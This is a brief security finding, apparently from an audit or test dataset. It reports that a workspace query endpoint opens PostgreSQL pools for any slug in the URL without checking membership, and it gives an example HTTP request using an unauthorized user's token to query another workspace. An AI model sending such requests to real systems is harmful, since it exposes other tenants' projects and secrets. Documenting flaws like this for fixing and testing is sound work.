diagnosis: The workspace query endpoint instantiates and accesses dedicated PostgreSQL pools based on req.params.workspaceSlug without verifying that the authenticated user is a member of that workspace. An attacker can supply arbitrary workspace slugs in the URL path and extract client projects and secrets from other workspaces.
exploit_request:
POST /api/workspaces/acme_hedgefund/query HTTP/1.1
Host: api.workspaces.internal:9102
Authorization: Bearer <unauthorized_user_jwt>
Content-Type: application/json

{
  "filterField": "status",
  "filterValue": "ACTIVE"
}
